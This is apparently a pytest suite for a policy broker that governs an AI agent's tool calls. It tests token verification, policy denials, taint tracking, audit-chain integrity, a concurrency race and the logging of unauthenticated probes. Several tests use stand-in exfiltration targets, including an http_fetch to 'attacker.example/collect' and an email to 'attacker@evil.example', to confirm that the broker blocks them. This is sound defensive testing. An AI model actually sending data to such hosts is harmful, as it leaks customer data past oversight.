import asyncio
import json

import httpx
import pytest
from fastapi import Request
from fastapi.testclient import TestClient

from broker.adapters.base import ToolResult
from broker.app import create_app
from broker.audit import AuditLog
from broker.control import create_control_app
from broker.identity import Signer, Verifier
from broker.pdp import PolicyDecisionPoint
from broker.taint import TaintTracker
from mocks.seed_db import seed_customers
from tests.support.catalog import demo_catalog


@pytest.fixture
def signer():
    return Signer.generate()


def build(tmp_path, signer, opa_payload, backend_handler=None):
    db = tmp_path / "customers.db"
    seed_customers(db, count=120)

    def opa_handler(request):
        return httpx.Response(200, json={"result": opa_payload})

    backend_handler = backend_handler or (lambda request: httpx.Response(200, text="doc-body"))
    audit = AuditLog(tmp_path / "audit.jsonl")
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=TaintTracker(),
        audit=audit,
        catalog=demo_catalog(
            docstore_url="http://docstore.internal",
            db_path=db,
            mailer_url="http://mailer.internal",
            client=httpx.Client(transport=httpx.MockTransport(backend_handler)),
        ),
        policy_digest="sha256:test",
    )
    return TestClient(app), audit


def app_with_catalog(tmp_path, catalog):
    """Like build(), but takes a caller-supplied catalog directly instead of
    reconstructing one from a fixed docstore/db/mailer set of URLs -- for
    tests that need to hand the broker a catalog shaped a particular way
    (e.g. a schema that leaves an arg optional that the adapter still
    dereferences). Mints a token authorized for every tool the catalog
    knows. Returns (audit, TestClient(app), token)."""
    signer = Signer.generate()

    def opa_handler(request):
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    audit = AuditLog(tmp_path / "audit.jsonl")
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=TaintTracker(),
        audit=audit,
        catalog=catalog,
        policy_digest="sha256:test",
    )
    token = signer.mint(
        agent_id="triage-bot",
        task_id="4711",
        purpose="support-triage",
        allowed_tools=list(catalog.names()),
        data_classes=["public"],
        counterparties=["customer:8812"],
    )
    return audit, TestClient(app), token


def token_for(signer, **overrides):
    fields = dict(
        agent_id="triage-bot",
        task_id="4711",
        purpose="support-triage",
        allowed_tools=["read_document", "query_customers", "http_fetch"],
        data_classes=["public"],
        counterparties=["customer:8812"],
    )
    fields.update(overrides)
    return signer.mint(**fields)


def invoke(client, token, tool, args):
    return client.post(
        f"/v1/tools/{tool}/invoke",
        json={"args": args},
        headers={"Authorization": f"Bearer {token}"},
    )


def test_allowed_call_executes_and_returns_content(tmp_path, signer):
    client, _ = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    response = invoke(client, token_for(signer), "read_document", {"doc_id": "ticket-4711"})
    assert response.status_code == 200
    assert response.json()["content"] == "doc-body"


def test_denied_call_returns_a_structured_error(tmp_path, signer):
    client, _ = build(
        tmp_path, signer, {"allow": False, "deny_reasons": ["egress.pii_sink"]}
    )
    response = invoke(client, token_for(signer), "http_fetch", {"url": "http://x.internal/a"})
    assert response.status_code == 403
    assert response.json() == {
        "error": "policy_denied",
        "rule": "egress.pii_sink",
        "message": "Denied by policy rule egress.pii_sink.",
    }


def test_denied_call_does_not_execute_the_backend(tmp_path, signer):
    calls = []

    def backend_handler(request):
        calls.append(request.url)
        return httpx.Response(200, text="should-not-happen")

    client, _ = build(
        tmp_path,
        signer,
        {"allow": False, "deny_reasons": ["egress.allowlist"]},
        backend_handler,
    )
    invoke(client, token_for(signer), "http_fetch", {"url": "http://attacker.example/collect"})
    assert calls == []


def test_missing_token_is_rejected(tmp_path, signer):
    client, _ = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    response = client.post("/v1/tools/read_document/invoke", json={"args": {}})
    assert response.status_code == 401


def test_expired_token_is_rejected(tmp_path, signer):
    client, _ = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    stale = token_for(signer)
    import broker.app as app_module

    original = app_module.now
    app_module.now = lambda: 10**12
    try:
        response = invoke(client, stale, "read_document", {"doc_id": "x"})
    finally:
        app_module.now = original
    assert response.status_code == 401


def test_unknown_tool_is_denied_before_any_policy_query(tmp_path, signer):
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    response = invoke(client, token_for(signer), "rm_minus_rf", {})
    assert response.status_code == 403
    assert audit.records()[-1]["rule"] == "tools.allowed"


def test_every_decision_is_audited_with_an_intact_chain(tmp_path, signer):
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    invoke(client, token_for(signer), "read_document", {"doc_id": "a"})
    invoke(client, token_for(signer), "read_document", {"doc_id": "b"})
    records = audit.records()
    assert len(records) == 2
    assert [r["decision"] for r in records] == ["allow", "allow"]
    assert audit.verify_chain() == (True, None)


def test_audit_record_precedes_execution(tmp_path, signer):
    order = []

    def backend_handler(request):
        order.append("executed")
        return httpx.Response(200, text="body")

    client, audit = build(
        tmp_path, signer, {"allow": True, "deny_reasons": []}, backend_handler
    )
    original_append = audit.append

    def spy(**kwargs):
        order.append("audited")
        return original_append(**kwargs)

    audit.append = spy
    invoke(client, token_for(signer), "read_document", {"doc_id": "a"})
    assert order == ["audited", "executed"]


def test_reading_customers_taints_the_task_for_later_calls(tmp_path, signer):
    seen = []

    def opa_handler(request):
        seen.append(request.read())
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    db = tmp_path / "customers.db"
    seed_customers(db, count=120)
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=TaintTracker(),
        audit=AuditLog(tmp_path / "audit.jsonl"),
        catalog=demo_catalog(
            docstore_url="http://docstore.internal",
            db_path=db,
            mailer_url="http://mailer.internal",
            client=httpx.Client(
                transport=httpx.MockTransport(lambda r: httpx.Response(200, text="x"))
            ),
        ),
        policy_digest="sha256:test",
    )
    client = TestClient(app)
    token = token_for(signer)
    invoke(client, token, "query_customers", {"filter": "id=8812"})
    invoke(client, token, "http_fetch", {"url": "http://x.internal/a"})

    import json

    second_input = json.loads(seen[1])["input"]
    assert second_input["task_state"]["data_classes_held"] == ["pii"]
    assert second_input["task_state"]["rows_returned_so_far"] == 1


def test_audit_write_failure_refuses_the_action(tmp_path, signer):
    calls = []

    def backend_handler(request):
        calls.append(request.url)
        return httpx.Response(200, text="body")

    client, audit = build(
        tmp_path, signer, {"allow": True, "deny_reasons": []}, backend_handler
    )

    def explode(**kwargs):
        raise OSError("disk full")

    audit.append = explode
    response = invoke(client, token_for(signer), "read_document", {"doc_id": "a"})
    assert response.status_code == 503
    assert response.json()["error"] == "audit_unavailable"
    assert calls == []


def test_control_plane_mints_a_usable_token(signer):
    client = TestClient(create_control_app(signer=signer))
    response = client.post(
        "/v1/tokens",
        json={
            "agent_id": "triage-bot",
            "task_id": "4711",
            "purpose": "support-triage",
            "allowed_tools": ["read_document"],
            "data_classes": ["public"],
            "counterparties": ["customer:8812"],
        },
    )
    assert response.status_code == 200
    token = Verifier(signer.public_key_pem()).verify(response.json()["token"])
    assert token.purpose == "support-triage"


def test_agent_app_does_not_expose_the_minting_route(tmp_path, signer):
    client, _ = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    assert client.post("/v1/tokens", json={}).status_code == 404


# --- Carry-forward 1: backend failures must become audited denials, not bare 500s. ---


def test_describe_failure_is_audited_as_malformed_input(tmp_path, signer):
    """A query_customers filter that backends.describe() cannot parse (a
    ValueError from the int() call in _where()) must not surface as an
    unhandled 500. It is still shaped correctly (filter is a string), so
    the pre-describe() shape check lets it through; describe() itself then
    rejects it. This is the agent's fault -- it is a client-caused failure,
    not a backend fault -- so it is audited as a deny under input.malformed
    and reported with the same 403 policy_denied shape as any other
    denial, not a 502 (see finding 4: 502 is reserved for genuine backend
    faults, so the caller can tell "you sent nonsense" apart from "the
    docstore is down")."""
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    response = invoke(client, token_for(signer), "query_customers", {"filter": "id=abc"})
    assert response.status_code == 403
    assert response.json() == {
        "error": "policy_denied",
        "rule": "input.malformed",
        "message": "Denied by policy rule input.malformed.",
    }

    records = audit.records()
    assert len(records) == 1
    assert records[-1]["decision"] == "deny"
    assert records[-1]["rule"] == "input.malformed"


def test_execute_http_status_failure_becomes_backend_error_without_double_audit(
    tmp_path, signer
):
    """backends.execute() raises httpx.HTTPStatusError when the http_fetch
    destination answers non-2xx. The decision was already made and durably
    audited as an allow before execute() ran, so this must not write a
    second decision record -- only the 502 changes, the original allow
    record stands alone."""

    def backend_handler(request):
        return httpx.Response(500, text="upstream on fire")

    client, audit = build(
        tmp_path, signer, {"allow": True, "deny_reasons": []}, backend_handler
    )
    response = invoke(client, token_for(signer), "http_fetch", {"url": "http://x.internal/a"})
    assert response.status_code == 502
    body = response.json()
    assert body["error"] == "backend_error"
    assert "message" in body

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "allow"


def test_execute_connection_failure_becomes_backend_error(tmp_path, signer):
    """A connection-level httpx failure (timeout, refused connection, ...)
    during execute() must be caught the same way as an HTTP status error --
    it is still an httpx.HTTPError -- rather than escaping as a 500."""

    def backend_handler(request):
        raise httpx.ConnectError("connection refused", request=request)

    client, audit = build(
        tmp_path, signer, {"allow": True, "deny_reasons": []}, backend_handler
    )
    response = invoke(client, token_for(signer), "http_fetch", {"url": "http://x.internal/a"})
    assert response.status_code == 502
    assert response.json()["error"] == "backend_error"

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "allow"


# --- Code review round 2: findings 1, 2, 3, 4, 5 ---


def test_missing_required_arg_is_denied_before_reaching_the_backend(tmp_path, signer):
    """Finding 1's exact repro: read_document with no doc_id used to raise
    KeyError('doc_id') inside execute() *after* the allow record was
    already durably audited -- the audit log then asserted an authorized
    read that never actually happened. The pre-describe() shape check
    (finding 3) now catches this before any decision is made at all, so
    only a single deny record exists, never an allow."""
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    response = invoke(client, token_for(signer), "read_document", {})
    assert response.status_code == 403
    assert response.json()["rule"] == "input.malformed"

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "deny"
    assert records[0]["rule"] == "input.malformed"


def test_execute_guard_catches_any_exception_not_just_httpx_errors(tmp_path, signer):
    """Finding 1: the guard around catalog.execute() must not be scoped
    to httpx errors -- it must catch anything, because by the time
    execute() runs the allow decision is already durable, and letting
    *any* exception escape here means the audit log asserts an authorized
    action that never happened."""
    db = tmp_path / "customers.db"
    seed_customers(db, count=5)

    def opa_handler(request):
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    catalog = demo_catalog(
        docstore_url="http://docstore.internal",
        db_path=db,
        mailer_url="http://mailer.internal",
        client=httpx.Client(
            transport=httpx.MockTransport(lambda r: httpx.Response(200, text="x"))
        ),
    )

    def exploding_execute(tool, args):
        raise RuntimeError("a backend bug unrelated to httpx")

    catalog.execute = exploding_execute

    audit = AuditLog(tmp_path / "audit.jsonl")
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=TaintTracker(),
        audit=audit,
        catalog=catalog,
        policy_digest="sha256:test",
    )
    client = TestClient(app)
    response = invoke(client, token_for(signer), "read_document", {"doc_id": "a"})

    assert response.status_code == 502
    assert response.json()["error"] == "backend_error"

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "allow"


@pytest.mark.parametrize(
    "raw_body",
    [b"not json at all {{{", b"[]", b'"just a string"', b"null", b"42"],
)
def test_malformed_or_non_object_body_is_audited_as_malformed_input(tmp_path, signer, raw_body):
    """Finding 2: neither invalid JSON, nor JSON that parses fine but
    isn't an object (a list, a bare string, null, a number, ...), may
    reach body.get("args", {}) -- that used to be an unhandled 500 with
    zero audit trail. Both are treated the same as any other malformed
    input: audited as a deny under input.malformed."""
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    response = client.post(
        "/v1/tools/read_document/invoke",
        content=raw_body,
        headers={
            "Authorization": f"Bearer {token_for(signer)}",
            "Content-Type": "application/json",
        },
    )
    assert response.status_code == 403
    assert response.json() == {
        "error": "policy_denied",
        "rule": "input.malformed",
        "message": "Denied by policy rule input.malformed.",
    }

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "deny"
    assert records[0]["rule"] == "input.malformed"


def test_send_email_recipients_must_be_a_list_not_a_bare_string(tmp_path, signer):
    """Finding 3's exact repro: send_email with "to" as the bare string
    "attacker@evil.example" makes backends.describe() (which does
    tuple(args.get("to", []))) see twenty-one single-character
    recipients, while backends.execute() would pass the original whole
    string through to the mailer untouched -- the policy and the action
    would be judging two different targets. Reject the shape before
    either stage ever sees it, so the mailer is never reached at all."""
    calls = []

    def backend_handler(request):
        calls.append(request.url)
        return httpx.Response(200, text="sent")

    client, audit = build(
        tmp_path, signer, {"allow": True, "deny_reasons": []}, backend_handler
    )
    token = token_for(signer, allowed_tools=["send_email"])
    response = invoke(
        client,
        token,
        "send_email",
        {"to": "attacker@evil.example", "subject": "hi", "body": "hello"},
    )
    assert response.status_code == 403
    assert response.json()["rule"] == "input.malformed"
    assert calls == []  # the mailer must never be reached

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "deny"
    assert records[0]["rule"] == "input.malformed"


def test_send_email_with_a_well_shaped_recipient_list_is_allowed(tmp_path, signer):
    """Positive control for finding 3's shape check: a properly shaped
    call (a real list of string recipients) must not be over-rejected."""
    calls = []

    def backend_handler(request):
        calls.append(request.url)
        return httpx.Response(200, text="sent")

    client, _ = build(
        tmp_path, signer, {"allow": True, "deny_reasons": []}, backend_handler
    )
    token = token_for(signer, allowed_tools=["send_email"])
    response = invoke(
        client,
        token,
        "send_email",
        {"to": ["customer@example.invalid"], "subject": "hi", "body": "hello"},
    )
    assert response.status_code == 200
    assert len(calls) == 1


def test_genuine_backend_fault_during_describe_is_not_blamed_on_the_agent(tmp_path, signer):
    """Finding 4: a server-side bug in describe() (anything other than
    the client-caused ValueError path a bad filter value takes) must not
    be recorded as an input.malformed deny -- that would blame the agent
    for our defect. It is reported as a plain backend fault instead, with
    nothing audited against the agent."""
    db = tmp_path / "customers.db"
    seed_customers(db, count=5)

    def opa_handler(request):
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    catalog = demo_catalog(
        docstore_url="http://docstore.internal",
        db_path=db,
        mailer_url="http://mailer.internal",
        client=httpx.Client(
            transport=httpx.MockTransport(lambda r: httpx.Response(200, text="x"))
        ),
    )

    def exploding_describe(tool, args):
        raise AttributeError("some internal bug, not the agent's doing")

    catalog.describe = exploding_describe

    audit = AuditLog(tmp_path / "audit.jsonl")
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=TaintTracker(),
        audit=audit,
        catalog=catalog,
        policy_digest="sha256:test",
    )
    client = TestClient(app)
    response = invoke(client, token_for(signer), "read_document", {"doc_id": "a"})

    assert response.status_code == 502
    assert response.json()["error"] == "backend_error"
    assert audit.records() == []


def test_negative_row_count_from_a_backend_is_rejected_not_clamped(tmp_path, signer):
    """Finding 5: a backend that reports a negative row count must not be
    silently clamped to zero, which would under-count a security budget
    rows.bounded relies on. taint.py's ValueError is the intended signal
    (Task 5's review explicitly chose reject over clamp) and it must
    surface here, not be swallowed. The already-durable allow record
    stands; the taint state itself is left untouched by the rejected
    update."""
    db = tmp_path / "customers.db"
    seed_customers(db, count=5)

    def opa_handler(request):
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    catalog = demo_catalog(
        docstore_url="http://docstore.internal",
        db_path=db,
        mailer_url="http://mailer.internal",
        client=httpx.Client(
            transport=httpx.MockTransport(lambda r: httpx.Response(200, text="x"))
        ),
    )
    original_execute = catalog.execute

    def execute_with_bogus_rows(tool, args):
        result = original_execute(tool, args)
        return ToolResult(content=result.content, rows=-5, data_class=result.data_class)

    catalog.execute = execute_with_bogus_rows

    taint = TaintTracker()
    audit = AuditLog(tmp_path / "audit.jsonl")
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=taint,
        audit=audit,
        catalog=catalog,
        policy_digest="sha256:test",
    )
    client = TestClient(app)
    token = token_for(signer)
    response = invoke(client, token, "read_document", {"doc_id": "a"})

    assert response.status_code == 502
    assert response.json()["error"] == "backend_error"

    records = audit.records()
    assert len(records) == 1
    assert records[0]["decision"] == "allow"

    state = taint.snapshot("4711")  # token_for()'s default task_id
    assert state["rows_returned_so_far"] == 0
    assert state["data_classes_held"] == []


# --- Beyond-the-brief verification ---


def _build_with_spies(tmp_path, signer):
    """Like build(), but exposes the pdp and catalog instances wrapped
    with call-recording spies, so a test can prove a stage was never
    reached rather than merely asserting the final status code."""
    db = tmp_path / "customers.db"
    seed_customers(db, count=5)

    def opa_handler(request):
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    def backend_handler(request):
        return httpx.Response(200, text="doc-body")

    pdp = PolicyDecisionPoint(
        "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
    )
    catalog = demo_catalog(
        docstore_url="http://docstore.internal",
        db_path=db,
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(backend_handler)),
    )

    decide_calls = []
    original_decide = pdp.decide

    def decide_spy(input_doc):
        decide_calls.append(input_doc)
        return original_decide(input_doc)

    pdp.decide = decide_spy

    describe_calls = []
    original_describe = catalog.describe

    def describe_spy(tool, args):
        describe_calls.append((tool, args))
        return original_describe(tool, args)

    catalog.describe = describe_spy

    audit = AuditLog(tmp_path / "audit.jsonl")
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=pdp,
        taint=TaintTracker(),
        audit=audit,
        catalog=catalog,
        policy_digest="sha256:test",
    )
    return TestClient(app), decide_calls, describe_calls


def test_unverified_token_never_reaches_pdp_or_backend(tmp_path, signer):
    """A token signed by a key the broker does not trust must be rejected
    before the PDP or the backend describe() step is ever touched -- proven
    here by recording calls rather than just checking the status code."""
    client, decide_calls, describe_calls = _build_with_spies(tmp_path, signer)
    untrusted_signer = Signer.generate()
    bogus_token = token_for(untrusted_signer)

    response = invoke(client, bogus_token, "read_document", {"doc_id": "x"})

    assert response.status_code == 401
    assert describe_calls == []
    assert decide_calls == []


def test_expired_token_never_reaches_pdp_or_backend(tmp_path, signer):
    """Same proof as above, for an expired-but-otherwise-valid token."""
    client, decide_calls, describe_calls = _build_with_spies(tmp_path, signer)
    stale = token_for(signer)

    import broker.app as app_module

    original = app_module.now
    app_module.now = lambda: 10**12
    try:
        response = invoke(client, stale, "read_document", {"doc_id": "x"})
    finally:
        app_module.now = original

    assert response.status_code == 401
    assert describe_calls == []
    assert decide_calls == []


def test_policy_input_task_state_is_the_pre_execution_snapshot(tmp_path, signer):
    """The row bound OPA enforces is already_read + about_to_read. That only
    works if task_state in the policy input is the snapshot taken BEFORE
    this call executes. Prove it directly: a single query_customers call
    that returns 120 rows must still report rows_returned_so_far == 0 to
    the PDP for that same call, because taint.record_read() has not run
    yet when decide() is invoked."""
    import json

    seen = []

    def opa_handler(request):
        seen.append(json.loads(request.read()))
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    db = tmp_path / "customers.db"
    seed_customers(db, count=120)
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=TaintTracker(),
        audit=AuditLog(tmp_path / "audit.jsonl"),
        catalog=demo_catalog(
            docstore_url="http://docstore.internal",
            db_path=db,
            mailer_url="http://mailer.internal",
            client=httpx.Client(
                transport=httpx.MockTransport(lambda r: httpx.Response(200, text="x"))
            ),
        ),
        policy_digest="sha256:test",
    )
    client = TestClient(app)
    response = invoke(client, token_for(signer), "query_customers", {"filter": "all"})

    assert response.status_code == 200
    assert response.json()["rows"] == 120
    assert seen[0]["input"]["task_state"]["rows_returned_so_far"] == 0


# --- Concurrency: the TOCTOU this branch's review pass found while writing
# THREAT_MODEL.md. broker/app.py's only await must run BEFORE the taint
# snapshot, or two concurrent calls for the same task can both read a stale
# rows_returned_so_far and both be approved even though their combined total
# breaks the bound. TestClient makes one request run to completion before the
# next starts, so it cannot exercise this -- the two calls below are fired
# directly at the ASGI endpoint function via asyncio.gather, each backed by a
# hand-built Request whose receive() forces a real, deterministic suspension
# (await asyncio.sleep(0)) at exactly the point a real body read would
# suspend, so they genuinely interleave on one event loop instead of merely
# running back-to-back.


def _find_invoke_endpoint(app):
    return next(r for r in app.routes if r.path == "/v1/tools/{tool}/invoke").endpoint


def _concurrent_request(token: str, body: bytes) -> Request:
    scope = {
        "type": "http",
        "method": "POST",
        "path": "/v1/tools/query_customers/invoke",
        "query_string": b"",
        "headers": [(b"authorization", f"Bearer {token}".encode())],
        "server": ("test", 80),
        "client": ("test", 12345),
        "scheme": "http",
    }
    sent = False

    async def receive():
        nonlocal sent
        if not sent:
            sent = True
            await asyncio.sleep(0)
            return {"type": "http.request", "body": body, "more_body": False}
        await asyncio.sleep(3600)  # pragma: no cover -- never reached in this test

    return Request(scope, receive)


async def test_concurrent_reads_for_the_same_task_do_not_exceed_the_row_bound(
    tmp_path, signer
):
    """Fires two query_customers calls at the same task concurrently, each
    requesting more than half the row bound, so their combined total (60)
    breaks the configured limit (50) unless the second one is denied. This
    is the regression test for the race: with the snapshot taken before the
    request body is parsed (the bug), both calls read rows_returned_so_far=0
    and both get approved -- proven by running this same scenario against
    that ordering, which fails with two 200s and a final count of 60. With
    the fix, the second call's snapshot reflects the first call's already-
    recorded read, and it is denied under rows.bounded."""
    max_rows = 50
    db = tmp_path / "customers.db"
    seed_customers(db, count=30)  # one full read is 30 rows; two would be 60 > 50

    def opa_handler(request):
        payload = json.loads(request.read())
        task_state = payload["input"]["task_state"]
        target = payload["input"]["target"]
        total = task_state["rows_returned_so_far"] + target.get("estimated_rows", 0)
        if total > max_rows:
            return httpx.Response(
                200, json={"result": {"allow": False, "deny_reasons": ["rows.bounded"]}}
            )
        return httpx.Response(200, json={"result": {"allow": True, "deny_reasons": []}})

    audit = AuditLog(tmp_path / "audit.jsonl")
    taint = TaintTracker()
    app = create_app(
        verifier=Verifier(signer.public_key_pem()),
        pdp=PolicyDecisionPoint(
            "http://opa:8181", client=httpx.Client(transport=httpx.MockTransport(opa_handler))
        ),
        taint=taint,
        audit=audit,
        catalog=demo_catalog(
            docstore_url="http://docstore.internal",
            db_path=db,
            mailer_url="http://mailer.internal",
            client=httpx.Client(
                transport=httpx.MockTransport(lambda r: httpx.Response(200, text="x"))
            ),
        ),
        policy_digest="sha256:test",
    )
    invoke_endpoint = _find_invoke_endpoint(app)
    token = token_for(signer)
    body = json.dumps({"args": {"filter": "all"}}).encode()

    response_a, response_b = await asyncio.gather(
        invoke_endpoint("query_customers", _concurrent_request(token, body)),
        invoke_endpoint("query_customers", _concurrent_request(token, body)),
    )

    statuses = sorted([response_a.status_code, response_b.status_code])
    assert statuses == [200, 403], (
        "both concurrent reads were allowed -- the row bound was bypassed "
        f"(got {response_a.status_code} and {response_b.status_code})"
    )
    denied = response_a if response_a.status_code == 403 else response_b
    assert json.loads(denied.body)["rule"] == "rows.bounded"

    # The property that actually matters, independent of which call "won":
    # the recorded total must never exceed the configured bound.
    final_rows = taint.snapshot("4711")["rows_returned_so_far"]  # token_for()'s default task_id
    assert final_rows <= max_rows
    assert len(audit.records()) == 2


# --- Refusing is half the job; recording it is the other half ---------------
#
# A missing, malformed, or expired token used to return 401 and write nothing
# at all: three such requests produced zero audit records. That is the exact
# defect class fixed three times in the proxy, whose own comment calls the
# equivalent record "the single most valuable record the proxy produces" --
# a call arriving with no authority is what a probe looks like, and an
# unrecorded refusal makes it indistinguishable from a run that never
# happened. The sentinel principal fields mirror broker/proxy.py's
# _audit_refusal, so the replay renderer already knows how to display them.


def _unauthenticated_requests(client, signer):
    """The three ways a caller reaches the tool API with no usable token."""
    client.post("/v1/tools/read_document/invoke", json={"args": {"doc_id": "a"}})
    client.post(
        "/v1/tools/read_document/invoke",
        json={"args": {"doc_id": "a"}},
        headers={"Authorization": "Bearer not-a-jwt-at-all"},
    )
    import broker.app as app_module

    original = app_module.now
    app_module.now = lambda: 10**12
    try:
        invoke(client, token_for(signer), "read_document", {"doc_id": "a"})
    finally:
        app_module.now = original


def test_every_unauthenticated_call_leaves_an_audit_record(tmp_path, signer):
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    _unauthenticated_requests(client, signer)

    records = audit.records()
    assert len(records) == 3, "a refusal that leaves no trace makes a probe invisible"
    assert [r["decision"] for r in records] == ["deny"] * 3
    assert [r["rule"] for r in records] == ["unauthenticated"] * 3


def test_the_unauthenticated_record_carries_sentinel_principal_fields(tmp_path, signer):
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    client.post("/v1/tools/query_customers/invoke", json={"args": {"filter": "all"}})

    record = audit.records()[-1]
    assert record["task_id"] == "-"
    assert record["agent_id"] == "unauthenticated"
    assert record["purpose"] == "-"
    # The tool that was attempted is still named -- that is the point of the
    # record -- but nothing about the caller's claimed target is trusted.
    assert record["action"] == {"type": "tool_call", "tool": "query_customers"}
    assert record["target"]["kind"] == "unknown"
    assert record["args_digest"] == "sha256:none"


def test_unauthenticated_records_chain_with_real_decisions(tmp_path, signer):
    """The sentinel records go into the same log as authorized decisions, so
    they must not break the hash chain the replay artifact depends on."""
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})
    invoke(client, token_for(signer), "read_document", {"doc_id": "a"})
    _unauthenticated_requests(client, signer)
    invoke(client, token_for(signer), "read_document", {"doc_id": "b"})

    assert audit.verify_chain() == (True, None)
    assert [r["agent_id"] for r in audit.records()] == [
        "triage-bot", "unauthenticated", "unauthenticated", "unauthenticated", "triage-bot",
    ]


def test_an_unauthenticated_call_still_returns_401_and_touches_nothing(tmp_path, signer):
    """Recording the attempt must not turn it into a partially-served
    request: the status stays 401 and neither the PDP nor a backend is
    reached."""
    client, decide_calls, describe_calls = _build_with_spies(tmp_path, signer)
    response = client.post("/v1/tools/read_document/invoke", json={"args": {"doc_id": "a"}})

    assert response.status_code == 401
    assert response.json()["error"] == "unauthenticated"
    assert decide_calls == []
    assert describe_calls == []


def test_an_unrecordable_unauthenticated_refusal_is_reported_not_hidden(tmp_path, signer):
    """Same rule as every other refusal on this surface: if it cannot be
    logged, the caller is told the audit log is unavailable rather than
    getting a clean 401 that leaves no trace. (The proxy deliberately differs
    -- see THREAT_MODEL.md.)"""
    client, audit = build(tmp_path, signer, {"allow": True, "deny_reasons": []})

    def explode(**kwargs):
        raise OSError("disk full")

    audit.append = explode
    response = client.post("/v1/tools/read_document/invoke", json={"args": {"doc_id": "a"}})
    assert response.status_code == 503
    assert response.json()["error"] == "audit_unavailable"


def test_a_missing_required_arg_is_audited_not_a_silent_502(tmp_path):
    """The hole config-driven validation opens.

    An arg an adapter dereferences but the schema does not require raises
    KeyError from describe(). KeyError is not ValueError, so it landed in the
    backend-fault branch: measured 502 with ZERO audit records, which is an
    agent probing with no trace -- the same defect _refuse_unauthenticated
    exists to close on the auth path.
    """
    from broker.config.catalog import CatalogEntry, ToolCatalog
    from broker.config.schema import ArgSpec, ToolSchema

    class Dereferences:
        target_kind = "doc"

        def describe(self, args):
            return args["absent"]          # KeyError

        def execute(self, args):           # pragma: no cover
            raise AssertionError("must never be reached")

    catalog = ToolCatalog({
        "loose": CatalogEntry(
            kind="docstore", target_kind="doc",
            # Deliberately does not require the arg describe() dereferences.
            schema=ToolSchema(args={"absent": ArgSpec(type="string")}),
            adapter=Dereferences(),
        )
    })
    audit, client, token = app_with_catalog(tmp_path, catalog)
    response = client.post(
        "/v1/tools/loose/invoke", json={"args": {}},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert response.status_code == 403
    assert response.json()["rule"] == "input.malformed"
    assert audit.records()[-1]["rule"] == "input.malformed"
    assert audit.records()[-1]["decision"] == "deny"
